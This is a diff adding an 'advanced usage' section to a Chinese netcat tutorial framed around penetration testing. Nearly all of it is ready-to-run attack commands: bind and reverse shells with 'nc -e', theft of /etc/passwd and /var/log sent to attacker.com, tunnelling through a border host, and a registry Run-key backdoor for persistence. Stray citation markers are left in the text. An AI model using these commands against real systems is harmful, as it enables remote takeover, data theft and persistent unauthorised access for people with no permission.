@@ -108,3 +108,62 @@ nc -l -p 8888 | tar -xzf -
 # 发送端
 tar -czf - /path/to/directory/ | nc 192.168.1.10 8888
 ```
+
+## 五、进阶用法
+
+### 5.1 反向 Shell（渗透测试核心）
+**正向 Shell**：目标机主动开放端口，攻击者连接[-9](https://cloud.tencent.com.cn/developer/article/1933543?from=15425)
+```bash
+# 目标机（Windows）
+nc -l -p 4444 -e cmd.exe
+# 目标机（Linux）
+nc -l -p 4444 -e /bin/bash
+# 攻击者连接
+nc target.com 4444
+```
+**反向 Shell**（更常用，可绕过防火墙）：目标机主动连接攻击者[-5](https://cyberpanel.net/blog/netcat-command-in-linux#:~:text=Let's%20dive%20in!-,What%20is%20Netcat%20Command%20in%20Linux?,get%20access%20to%20the%20remote.)[-9](https://cloud.tencent.com.cn/developer/article/1933543?from=15425)
+```bash
+# 攻击者监听
+nc -l -p 4444
+# 目标机执行（Windows）
+nc attacker.com 4444 -e cmd.exe
+# 目标机执行（Linux）
+nc attacker.com 4444 -e /bin/bash
+```
+### 5.2 数据窃取
+
+**单个文件窃取**[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)
+```bash
+# 攻击者监听接收
+nc -l -p 4444 > stolen_data.txt
+# 目标机发送
+nc attacker.com 4444 < /etc/passwd
+```
+**批量窃取（结合 tar）**[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)
+```bash
+# 攻击者监听并解压
+nc -l -p 4444 | tar -xzf -
+# 目标机：打包 /var/log 并发送
+tar -czf - /var/log/ | nc attacker.com 4444
+```
+### 5.3 端口转发与隧道
+
+**通过边界主机建立隧道**[-3](https://developer.aliyun.com/article/1684112)
+```bash
+# 边界主机执行（同时连接外网攻击者和内网目标）
+# 将攻击者的连接转发给内网目标
+nc -v attacker.com 3333 -c "nc -v internal-target.com 4444"
+```
+### 5.4 简易 Web 服务器
+```bash
+# 返回固定内容
+echo -e "HTTP/1.1 200 OK\r\n\r\nHello!" | nc -l -p 8080
+# 返回文件内容
+{ echo -e "HTTP/1.1 200 OK\r\n"; cat index.html; } | nc -l -p 8080[citation:7]
+```
+### 5.5 留后门（持久化）
+
+在 Windows 注册表添加开机自启[-8](https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/mastering-netcat-in-penetration-testing-a-step-by-step-tutorial/)：
+```cmd
+reg add HKLM\software\microsoft\windows\currentversion\run /v netcat /t REG_SZ /d "nc -l -p 4444 -e cmd.exe"#
+```
